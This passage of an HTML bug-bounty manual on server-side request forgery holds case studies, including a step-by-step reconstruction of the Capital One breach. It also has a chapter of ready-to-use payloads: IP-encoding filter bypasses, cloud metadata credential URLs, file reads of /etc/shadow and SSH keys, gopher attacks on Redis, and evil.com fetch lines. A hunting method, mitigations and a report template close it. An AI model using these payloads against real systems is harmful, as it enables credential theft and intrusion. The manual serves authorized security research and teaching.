+        <li>Researched HackerOne Hacktivity → found 303 redirect bypass report #247680</li>
+        <li>Hosted PHP server returning 303 → metadata endpoint</li>
+        <li>Retrieved AWS Instance Metadata including IAM credentials</li>
+        <li>Dropbox verified, fixed, and paid $4,913</li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div>
+        <div class="r-company">U.S. Department of Defense — download-url SSRF</div>
+        <span class="r-badge r-critical">CRITICAL</span>
+      </div>
+      <div class="r-bounty">Paid (DoD VDP)</div>
+    </div>
+    <p><strong>Report #1624140 | Researcher: @rohsec</strong></p>
+    <p>A DoD application exposed <code>/api/v1/download-url?url=</code> — a trivially obvious SSRF parameter. The url parameter was not validated, allowing direct access to AWS metadata service. The application ran on AWS EC2, so the metadata IP was accessible.</p>
+    <pre>GET /api/v1/download-url?<span class="bad">url=http://169.254.169.254/latest/meta-data/</span>
+Host: [REDACTED DOD SYSTEM]</pre>
+    <div class="info-box bounty" style="margin-top:14px;">
+      <div class="box-title">💡 Lesson</div>
+      <p>Endpoints named "download", "fetch", "proxy", "preview" with a url= parameter are almost always SSRF. These are often forgotten API endpoints that missed the security review cycle. Wordlist scan API paths for these patterns.</p>
+    </div>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div>
+        <div class="r-company">LarkSuite — Wiki Import SSRF via File Upload</div>
+        <span class="r-badge r-critical">CRITICAL</span>
+      </div>
+      <div class="r-bounty">Critical Bounty Paid</div>
+    </div>
+    <p><strong>Researcher: @SirLeeroyJenkins | Platform: HackerOne</strong></p>
+    <p>Lark's Wiki feature allowed importing content from 4 document types. After trying XXE via Office document XML (which failed), the researcher focused on a web-import feature. By submitting a URL that pointed to an attacker-controlled redirect server, they bypassed Lark's SSRF protections and achieved full read of AWS metadata.</p>
+    <div class="r-steps">
+      <strong>Key insight from the researcher:</strong>
+      <ol class="r-steps">
+        <li>"Deep dive the application" — learn every feature inside out</li>
+        <li>File upload features involve server-side processing → always test for SSRF</li>
+        <li>Office documents (ZIP+XML) are a viable XXE/SSRF vector when server processes them</li>
+        <li>When direct SSRF is blocked, look for redirect chain bypass</li>
+      </ol>
+    </div>
+  </div>
+
+  <div class="report-card" style="border-left-color: var(--accent2);">
+    <div class="r-header">
+      <div>
+        <div class="r-company">Capital One — The $80M SSRF Breach (Not Bounty)</div>
+        <span class="r-badge r-critical">CRITICAL — 106 MILLION AFFECTED</span>
+      </div>
+      <div class="r-bounty">$80M Fine</div>
+    </div>
+    <p><strong>Attacker: Paige Thompson (ex-AWS engineer) | 2019</strong></p>
+    <p>The most consequential SSRF attack in history. Thompson built a scanning tool to identify AWS instances with misconfigured WAFs. Capital One's ModSecurity WAF was vulnerable — either the WAF itself was SSRF-able, or a misconfiguration allowed reaching an SSRF-vulnerable application behind it.</p>
+    <div class="r-steps">
+      <strong>Attack reconstruction:</strong>
+      <ol class="r-steps">
+        <li>Thompson's scanner identifies Capital One's misconfigured WAF on AWS</li>
+        <li>SSRF allows querying: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+        <li>Returns role name: <code>ISRM-WAF-Role</code></li>
+        <li>Second request: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role</code></li>
+        <li>Returns: AccessKeyId, SecretAccessKey, SessionToken</li>
+        <li>AWS CLI: <code>aws s3 ls</code> → 700+ S3 buckets visible</li>
+        <li><code>aws s3 sync s3://bucket ./local</code> — 30GB downloaded</li>
+        <li>Thompson brags about it on GitHub, IRC, Slack — gets reported and arrested</li>
+      </ol>
+    </div>
+    <div class="info-box danger" style="margin-top:14px;">
+      <div class="box-title">⚡ Root Cause Analysis</div>
+      <p><strong>Three failures compounded:</strong> 1) SSRF vulnerability in WAF/application not patched. 2) IAM role had AdministratorAccess-level S3 permissions — massive over-provisioning. 3) AWS IMDSv1 responded to simple GET requests with no authentication. AWS released IMDSv2 four months after the breach specifically to address this SSRF pattern.</p>
+    </div>
+  </div>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 10 ══════════════════════════ -->
+<section id="ch10">
+  <div class="chapter-header" data-ch="10">
+    <div class="ch-label">Chapter 10</div>
+    <h2>Complete Payload Arsenal</h2>
+    <p>Every payload you'll ever need — organized, annotated, and ready to use.</p>
+  </div>
+
+  <h3>10.1 Localhost Representations</h3>
+
+  <table class="payload-table">
+    <tr><th>Payload</th><th>Notes</th></tr>
+    <tr><td>http://localhost/</td><td>Standard, usually blocked first</td></tr>
+    <tr><td>http://127.0.0.1/</td><td>Standard, blocked by most filters</td></tr>
+    <tr><td>http://127.1/</td><td>Short form — only 2 octets (missing octets = 0)</td></tr>
+    <tr><td>http://127.0.1/</td><td>Three-octet form</td></tr>
+    <tr><td>http://0/</td><td>All-zeros → resolved as loopback by many libs</td></tr>
+    <tr><td>http://0.0.0.0/</td><td>All-zeros address</td></tr>
+    <tr><td>http://2130706433/</td><td>127.0.0.1 as 32-bit decimal</td></tr>
+    <tr><td>http://0x7f000001/</td><td>127.0.0.1 as hexadecimal</td></tr>
+    <tr><td>http://017700000001/</td><td>127.0.0.1 as octal</td></tr>
+    <tr><td>http://0177.0.0.1/</td><td>First octet as octal</td></tr>
+    <tr><td>http://[::1]/</td><td>IPv6 loopback</td></tr>
+    <tr><td>http://[::ffff:127.0.0.1]/</td><td>IPv4-mapped IPv6</td></tr>
+    <tr><td>http://[::ffff:7f00:1]/</td><td>IPv4-mapped IPv6 (hex)</td></tr>
+    <tr><td>http://[0:0:0:0:0:ffff:127.0.0.1]/</td><td>Full IPv4-mapped IPv6</td></tr>
+    <tr><td>http://localhost.localtest.me/</td><td>Always resolves to 127.0.0.1 via public DNS</td></tr>
+    <tr><td>http://127.0.0.1.nip.io/</td><td>nip.io wildcard DNS</td></tr>
+    <tr><td>http://spoofed.burpcollaborator.net/</td><td>Collaborator special hostname → 127.0.0.1</td></tr>
+    <tr><td>http://ip6-localhost/</td><td>/etc/hosts entry on Linux → ::1</td></tr>
+    <tr><td>http://ip6-loopback/</td><td>/etc/hosts entry → ::1</td></tr>
+  </table>
+
+  <h3>10.2 AWS Metadata Payloads</h3>
+
+  <pre><span class="c"># Core credential chain</span>
+http://169.254.169.254/
+http://169.254.169.254/latest/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="bad">ROLE-NAME</span>
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+<span class="c"># Alternative representations of 169.254.169.254</span>
+http://2852039166/                 <span class="c"># Decimal</span>
+http://0xA9FEA9FE/                 <span class="c"># Hex</span>
+http://0251.0376.0251.0376/        <span class="c"># Octal</span>
+http://[::ffff:169.254.169.254]/   <span class="c"># IPv6</span>
+http://169.254.169.254.nip.io/     <span class="c"># DNS-based</span>
+
+<span class="c"># GCP</span>
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/computeMetadata/v1/
+
+<span class="c"># Azure</span>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/
+http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net/</pre>
+
+  <h3>10.3 URL Scheme Payloads</h3>
+
+  <pre><span class="c"># File read</span>
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/maps
+file://localhost/etc/passwd
+file:///app/.env
+file:///var/www/html/config.php
+file:///home/user/.bash_history
+file:///root/.ssh/id_rsa
+
+<span class="c"># Network service interaction</span>
+dict://localhost:6379/INFO             <span class="c"># Redis INFO command</span>
+dict://127.0.0.1:11211/stats          <span class="c"># Memcached stats</span>
+sftp://evil.com:22/                   <span class="c"># SFTP</span>
+ldap://localhost:389/                 <span class="c"># LDAP</span>
+jar:http://evil.com/payload.jar!/     <span class="c"># Java JAR fetch</span>
+netdoc:///etc/passwd                  <span class="c"># Java only</span>
+
+<span class="c"># Gopher — raw protocol exploitation</span>
+gopher://127.0.0.1:6379/_PING%0D%0A        <span class="c"># Redis PING</span>
+gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A   <span class="c"># SMTP</span>
+gopher://127.0.0.1:9000/_               <span class="c"># FastCGI</span></pre>
+
+  <h3>10.4 Bypass Payload Chains</h3>
+
+  <pre><span class="c"># Double URL encode 'admin' keyword bypass</span>
+http://127.1/%2561dmin          <span class="c"># %25 → %, then %61 → a = admin</span>
+http://127.1/%61dmin           <span class="c"># %61 → a = admin (single encode)</span>
+http://127.1/ADMIN             <span class="c"># Case bypass</span>
+http://127.1/adm%69n           <span class="c"># Encode 'i' in admin</span>
+http://127.1/admi%6e           <span class="c"># Encode 'n' in admin</span>
+
+<span class="c"># Parser confusion (Orange Tsai)</span>
+http://expected@127.0.0.1/          <span class="c"># Validator reads expected, client dials 127.0.0.1</span>
+http://127.0.0.1@expected/          <span class="c"># Opposite behavior in some parsers</span>
+http://expected#127.0.0.1/         <span class="c"># Fragment trick</span>
+http://127.0.0.1%23@expected/      <span class="c"># Double-encoded fragment</span>
+http://expected%2523@127.0.0.1/    <span class="c"># Double-encode @ confusion</span>
+
+<span class="c"># Whitelist bypass via URL fragment</span>
+http://localhost%23@allowed-domain.com
+https://allowed.com#@evil.com/
+https://evil.com.allowed.com/    <span class="c"># DNS hierarchy</span>
+https://allowed.com.evil.com/    <span class="c"># If filter uses .contains()</span>
+
+<span class="c"># IPv6 zone identifier</span>
+http://[fe80::1%eth0]/           <span class="c"># Link-local IPv6 with zone</span>
+http://[::ffff:127.0.0.1%25eth0]/
+
+<span class="c"># CRLF injection in URL</span>
+http://evil.com/%0D%0AHost:%20127.0.0.1%0D%0A  <span class="c"># Host header injection</span></pre>
+
+  <h3>10.5 HTML-to-PDF SSRF Payloads</h3>
+
+  <pre><span class="c">&lt;!-- All of these trigger server-side requests in PDF generators --&gt;</span>
+
+<span class="c">&lt;!-- iframe src --&gt;</span>
+&lt;iframe src="http://169.254.169.254/latest/meta-data/"&gt;&lt;/iframe&gt;
+&lt;iframe src="file:///etc/passwd"&gt;&lt;/iframe&gt;
+
+<span class="c">&lt;!-- img src --&gt;</span>
+&lt;img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
+
+<span class="c">&lt;!-- CSS import --&gt;</span>
+&lt;style&gt;
+  @import url("http://169.254.169.254/latest/meta-data/");
+&lt;/style&gt;
+
+<span class="c">&lt;!-- link href --&gt;</span>
+&lt;link rel="stylesheet" href="http://169.254.169.254/"&gt;
+
+<span class="c">&lt;!-- script src --&gt;</span>
+&lt;script src="http://169.254.169.254/latest/meta-data/"&gt;&lt;/script&gt;
+
+<span class="c">&lt;!-- embed/object --&gt;</span>
+&lt;embed src="http://169.254.169.254/"&gt;
+&lt;object data="http://169.254.169.254/"&gt;&lt;/object&gt;</pre>
+
+  <h3>10.6 Parameter Wordlist for Fuzzing</h3>
+
+  <pre><span class="c"># Use this list with ffuf, Burp Intruder, or Arjun to discover hidden SSRF params</span>
+<span class="ok">url, uri, path, dest, redirect, next, target, link, source, image,
+image_url, avatar, callback, return, r, proxy, feed, data, reference,
+site, webhook, endpoint, host, page, file, document, import, fetch,
+resource, from, to, out, view, show, open, return_url, redirect_url,
+continue, go, forward, location, window, jump, action, auth, src,
+shareURL, templateURL, xmlrpc, iframeSrc, backgroundImage, stylesheetUrl,
+DownloadURL, profilePicUrl, logoUrl, bannerUrl, fullPath, repoUrl,
+contentUrl, entryPoint, relayState, ssoUrl, samlEndpoint, oidcUrl</span></pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 11 ══════════════════════════ -->
+<section id="ch11">
+  <div class="chapter-header" data-ch="11">
+    <div class="ch-label">Chapter 11</div>
+    <h2>Professional Hunting Methodology</h2>
+    <p>A systematic, repeatable process for finding SSRF in any target — from recon to critical report.</p>
+  </div>
+
+  <h3>11.1 The SSRF Hunting Workflow</h3>
+
+  <div class="phase">Phase 1 — Reconnaissance</div>
+  <div class="flow">
+    <div class="flow-step">
+      <div class="flow-num">1</div>
+      <div class="flow-text">
+        <strong>Enumerate all subdomains</strong>
+        <span>subfinder, assetfinder, amass — focus on api.*, app.*, admin.*, dev.* subdomains which host more complex functionality</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">2</div>
+      <div class="flow-text">
+        <strong>Crawl JS files for endpoints</strong>
+        <span>Use gau, waybackurls, or gospider. Extract JS files, grep for URL-accepting parameters, fetch() calls, axios calls</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">3</div>
+      <div class="flow-text">
+        <strong>Identify feature categories</strong>
+        <span>Map the application: document import, webhook settings, avatar URLs, link preview, PDF export, SSO config</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="phase">Phase 2 — Initial SSRF Detection</div>
+  <div class="flow">
+    <div class="flow-step">
+      <div class="flow-num">4</div>
+      <div class="flow-text">
+        <strong>Set up OOB detection</strong>
+        <span>Open Burp Collaborator, copy your URL. Also configure interactsh as a backup. Run Collaborator Everywhere in background.</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">5</div>
+      <div class="flow-text">
+        <strong>Test all URL-accepting parameters</strong>
+        <span>Send Collaborator URL to every field that might make server-side requests. Watch for DNS/HTTP interactions within 30 seconds.</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">6</div>
+      <div class="flow-text">
+        <strong>Test HTTP headers</strong>
+        <span>Inject Collaborator URL into Referer, X-Forwarded-For, X-Real-IP, Host, Origin, X-Forwarded-Host headers</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="phase">Phase 3 — Exploitation</div>
+  <div class="flow">
+    <div class="flow-step">
+      <div class="flow-num">7</div>
+      <div class="flow-text">
+        <strong>Confirm and identify variant</strong>
+        <span>DNS hit only = blind SSRF. HTTP hit = in-band or blind with HTTP confirmation. Response body in app = full SSRF.</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">8</div>
+      <div class="flow-text">
+        <strong>Attempt internal access</strong>
+        <span>Try localhost/127.0.0.1 for admin panels. Try 169.254.169.254 for cloud metadata. Record all responses.</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">9</div>
+      <div class="flow-text">
+        <strong>Apply bypass techniques if blocked</strong>
+        <span>Work through IP encodings, keyword bypasses, open redirect chaining, DNS rebinding systematically.</span>
+      </div>
+    </div>
+    <div class="flow-step ok">
+      <div class="flow-num">10</div>
+      <div class="flow-text">
+        <strong>Demonstrate maximum impact</strong>
+        <span>Cloud creds: call sts:GetCallerIdentity. Internal panel: read admin content. RCE: confirm execution safely.</span>
+      </div>
+    </div>
+  </div>
+
+  <h3>11.2 Toolset</h3>
+
+  <table class="payload-table">
+    <tr><th>Tool</th><th>Use Case</th></tr>
+    <tr><td>Burp Suite Pro</td><td>Intercept, Repeater, Intruder for scanning, Collaborator for OOB, Collaborator Everywhere extension</td></tr>
+    <tr><td>ffuf</td><td>Fast parameter fuzzing: ffuf -u https://target/api?FUZZ=http://collaborator -w params.txt</td></tr>
+    <tr><td>Arjun</td><td>Parameter discovery — finds hidden GET/POST params that accept URLs</td></tr>
+    <tr><td>Gopherus</td><td>Generate gopher:// payloads for Redis, MySQL, FastCGI, SMTP</td></tr>
+    <tr><td>SSRFmap</td><td>Automated SSRF exploitation framework — tests multiple protocols and targets</td></tr>
+    <tr><td>interactsh</td><td>Open-source OOB interaction server (alternative to Collaborator)</td></tr>
+    <tr><td>gau / waybackurls</td><td>Enumerate historical URLs — find forgotten endpoints with url= params</td></tr>
+    <tr><td>nuclei</td><td>Templates for SSRF detection at scale — ssrf-templates repo</td></tr>
+    <tr><td>SSRF-PayloadMaker</td><td>Generate 80K+ bypass combinations automatically</td></tr>
+    <tr><td>ipfuscator</td><td>Generate all IP obfuscation variants for a given address</td></tr>
+    <tr><td>r3dir</td><td>Redirect service for seamless target fuzzing via SSRF redirect chains</td></tr>
+  </table>
+
+  <h3>11.3 Target Selection for Maximum Bounty</h3>
+
+  <p>Not all SSRF is equal in bounty programs. Here's how to prioritize:</p>
+
+  <div class="method-grid">
+    <div class="method-card" style="border-left:3px solid var(--accent3);">
+      <div class="m-icon">☁️</div>
+      <div class="m-title">Cloud-Hosted Targets (AWS/GCP/Azure)</div>
+      <div class="m-desc">SSRF → cloud metadata → credentials. Highest potential impact. Check if target is on AWS EC2 via reverse DNS, response headers, or timing.</div>
+    </div>
+    <div class="method-card" style="border-left:3px solid var(--accent3);">
+      <div class="m-icon">📊</div>
+      <div class="m-title">Webhook / Integration Features</div>
+      <div class="m-desc">SaaS platforms with webhook delivery almost always test SSRF-able. Slack, Jira, GitHub, PagerDuty-style integrations.</div>
+    </div>
+    <div class="method-card" style="border-left:3px solid var(--warn);">
+      <div class="m-icon">🤖</div>
+      <div class="m-title">AI/LLM Applications</div>
+      <div class="m-desc">New class of SSRF: AI apps that browse URLs, fetch context, import knowledge bases, or generate content from URLs are all targets.</div>
+    </div>
+    <div class="method-card" style="border-left:3px solid var(--warn);">
+      <div class="m-icon">🔄</div>
+      <div class="m-title">Data Pipeline / ETL Tools</div>
+      <div class="m-desc">Anything that syncs data from external sources, batch jobs, scheduled imports. High chance of second-order SSRF.</div>
+    </div>
+  </div>
+
+  <h3>11.4 Finding Second-Order SSRF</h3>
+
+  <pre><span class="c"># Locations to inject Collaborator URLs for second-order SSRF:</span>
+Profile avatar URL field
+Company logo URL
+Notification webhook endpoint
+RSS/feed URL in subscriptions
+Template background image URL
+API callback URL
+Git repository URL (for import)
+Container registry URL
+npm/pip package registry URL
+SAML/OIDC metadata URL in SSO config
+
+<span class="c"># After injection:
+# - Wait 5–60 minutes for background jobs
+# - Trigger the job manually if possible (click "sync", "refresh", "import")
+# - Check Collaborator hourly for interactions
+# - Document exact timestamp of interaction vs submission</span></pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 12 ══════════════════════════ -->
+<section id="ch12">
+  <div class="chapter-header" data-ch="12">
+    <div class="ch-label">Chapter 12</div>
+    <h2>Defense Mechanisms &amp; Writing Winning Reports</h2>
+    <p>Understanding defenses makes you a better attacker. Writing great reports gets you paid.</p>
+  </div>
+
+  <h3>12.1 How Defenses Work (and How They Fail)</h3>
+
+  <h4>Blacklist-Based Filtering (Always Broken)</h4>
+  <p>Blocks specific strings like "127.0.0.1", "localhost", "169.254". Fails because the number of representations for any IP is essentially unbounded. Chapter 5 of this book documents dozens of bypasses — and that's far from complete.</p>
+
+  <h4>Allowlist-Based Filtering (Better, Still Bypassable)</h4>
+  <p>Only permits requests to specific approved destinations. Fails when: allowed domains have open redirects, URL parser inconsistencies allow confusion attacks, the allowlist is too broad (e.g., any subdomain of a large domain), or DNS rebinding is possible.</p>
+
+  <h4>Network-Level Controls (Strongest)</h4>
+  <p>Block outbound requests to RFC1918, loopback, and link-local ranges at the network layer. Requires egress filtering, VPC security groups, or iptables rules. Attackers must bypass this at the DNS/redirect level.</p>
+
+  <h4>IMDSv2 (Cloud-Specific Mitigation)</h4>
+  <p>AWS IMDSv2 requires a PUT request to get a session token, then that token must be included in all GET requests. Simple SSRF payloads that do GET-only requests can't get credentials. However, SSRF that can make PUT requests (e.g., via gopher://) can still chain IMDSv2.</p>
+
+  <h3>12.2 Proper Mitigations (For Your Report's Recommendation)</h3>
+
+  <pre><span class="c"># Application layer: use a maintained safe-URL library</span>
+<span class="c"># Python:</span>
+pip install requests-hardened  <span class="c"># Validates URLs against private IP ranges</span>
+
+<span class="c"># Node.js:</span>
+npm install ssrf-req-filter    <span class="c"># Rejects private IP requests</span>
+
+<span class="c"># Java: Apache HttpClient with custom RoutePlanner
+# Block all RFC1918 addresses: 10.*, 172.16-31.*, 192.168.*
+# Block loopback: 127.*
+# Block link-local: 169.254.*
+# Block IPv6 loopback: ::1
+# Block IPv6 link-local: fe80::/10
+
+# Cloud-specific:
+# AWS: Enforce IMDSv2 with PUT token requirement
+aws ec2 modify-instance-metadata-options \
+  --http-tokens required \        # Enforce IMDSv2
+  --instance-id i-XXXXX
+
+# Use least-privilege IAM roles
+# The WAF role that caused the Capital One breach should have had ZERO S3 permissions</span></pre>
+
+  <h3>12.3 Writing a Bug Report That Gets Paid</h3>
+
+  <p>The difference between a $0 report and a $10,000 report is often just the quality of the write-up. Here's the proven structure:</p>
+
+  <pre><span class="c"># REPORT TEMPLATE</span>
+
+<span class="ok">## Title</span>
+[CRITICAL] SSRF in [Feature Name] allows access to AWS instance metadata
+and exfiltration of IAM credentials
+
+<span class="ok">## Summary</span>
+A Server-Side Request Forgery vulnerability exists in [specific endpoint/feature].
+By manipulating the [parameter name] parameter, an attacker can cause the
+application server to make HTTP requests to arbitrary internal destinations,
+including the AWS EC2 metadata service at 169.254.169.254. This allows
+retrieval of the IAM role's temporary credentials, which have [describe
+permission scope] based on the attached policies.
+
+<span class="ok">## Severity: Critical</span>
+CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.9)
+
+<span class="ok">## Steps to Reproduce</span>
+1. Log in to [target] at https://target.com
+2. Navigate to [exact path to feature]
+3. Intercept with Burp Suite
+4. Modify the request:
+   [Exact HTTP request with highlighted change]
+5. Observe the response contains:
+   [Exact relevant portion of AWS metadata response]
+
+<span class="ok">## Impact</span>
+An unauthenticated/authenticated attacker can:
+- Retrieve temporary AWS credentials for IAM role: [ROLE-NAME]
+- The attached policy [POLICY-NAME] grants: [list permissions]
+- Use credentials to access: [S3 buckets / EC2 APIs / Secrets Manager / etc.]
+- Potential for lateral movement to [other resources]
+- Estimated data at risk: [what's in those S3 buckets]
+
+<span class="ok">## Proof of Concept</span>
+[Attach: Burp request/response showing credential in response]
+[Attach: Screenshot of sts:GetCallerIdentity confirming credential validity]
+[Attach: Brief description of what the role can access, without actually doing it]
+
+<span class="ok">## Remediation</span>
+1. Validate all user-supplied URLs against an allowlist of approved destinations
+2. Block requests to RFC1918, loopback, and link-local ranges
+3. Enforce AWS IMDSv2 (require PUT token for all metadata requests)
+4. Apply least-privilege to the IAM role attached to this instance
+5. Consider disabling metadata service access entirely if not required</pre>
+
+  <div class="info-box bounty">
+    <div class="box-title">🎯 What Maximizes Your Bounty</div>
+    <p><strong>DO:</strong> Show concrete impact (actual credentials retrieved, sts:GetCallerIdentity result, internal admin panel screenshot). Quantify the risk (what IAM permissions, what data is accessible). Submit clean, reproducible PoC. Disclose only to the program.</p>
+    <p><strong>DON'T:</strong> Actually download data. Reuse credentials. Access other customers' data. Submit vague "I found SSRF" without impact demonstration. A Collaborator callback alone is a medium-severity report; AWS credentials retrieved is critical.</p>
+  </div>
+
+  <h3>12.4 Practice Resources</h3>
+
+  <table class="payload-table">
+    <tr><th>Resource</th><th>Type</th><th>Cost</th></tr>
+    <tr><td>PortSwigger Web Security Academy — SSRF Module</td><td>7 free labs + theory</td><td>Free</td></tr>
+    <tr><td>HackTheBox — SSRF-tagged machines</td><td>CTF/labs</td><td>Free/Pro</td></tr>
+    <tr><td>TryHackMe — SSRF rooms</td><td>Guided labs</td><td>Free/Pro</td></tr>
+    <tr><td>PentesterLab — SSRF exercises</td><td>Code review + exploit</td><td>Pro $20/mo</td></tr>
+    <tr><td>HackerOne Hacktivity (filter: SSRF)</td><td>Real disclosed reports</td><td>Free</td></tr>
+    <tr><td>assetnote/blind-ssrf-chains (GitHub)</td><td>RCE chain documentation</td><td>Free</td></tr>
+    <tr><td>swisskyrepo/PayloadsAllTheThings</td><td>Payload reference</td><td>Free</td></tr>
+    <tr><td>PayloadBox/SSRF Attack Payloads (GitHub)</td><td>Payload lists</td><td>Free</td></tr>
+    <tr><td>Orange Tsai — A New Era of SSRF (BH 2017)</td><td>Research paper / slides</td><td>Free</td></tr>
+    <tr><td>PortSwigger URL Validation Bypass Cheat Sheet</td><td>Interactive payload generator</td><td>Free</td></tr>
+  </table>
+
+  <hr>
+
+  <div class="info-box tip">
+    <div class="box-title">📖 Key Takeaways</div>
+    <p><strong>1. Impact first:</strong> A Collaborator ping is a medium; AWS credentials is a critical. Always push to demonstrate maximum impact before submitting.</p>
+    <p><strong>2. Bypass everything:</strong> If the first payload is blocked, there are 50 more to try. Document what's blocked — it helps narrow down the filter type.</p>
+    <p><strong>3. Deep dive the app:</strong> The best SSRF targets are in features you discover by actually using the application, not by automated scanners. Understand what each feature does server-side.</p>
+    <p><strong>4. Second-order is undervalued:</strong> Most hunters test for immediate SSRF. Second-order SSRFs are found by fewer hunters and often have the same impact, but longer TTL to fix = more chance the company hasn't seen it.</p>
+    <p><strong>5. Cloud = critical by default:</strong> Any SSRF in a cloud-hosted application that can reach 169.254.169.254 is automatically a critical finding if the metadata response is returned. No further exploitation needed to justify critical severity.</p>
+  </div>
+
+</section>
+
+</main>
+
+<footer style="background:var(--surface); border-top:1px solid var(--border); padding:32px 24px; text-align:center;">
+  <p style="color:var(--muted); font-size:13px; font-family:'JetBrains Mono',monospace;">
+    SSRF COMPLETE FIELD MANUAL · Bug Bounty Edition 2025–2026<br>
+    <span style="color:var(--accent2);">For authorized security research and education only.</span><br>
+    Compiled from: PortSwigger, HackerOne Hacktivity, Assetnote Research, PayloadsAllTheThings, Orange Tsai's BH research, public breach analysis.
+  </p>
+</footer>
+
+</body>
+</html>
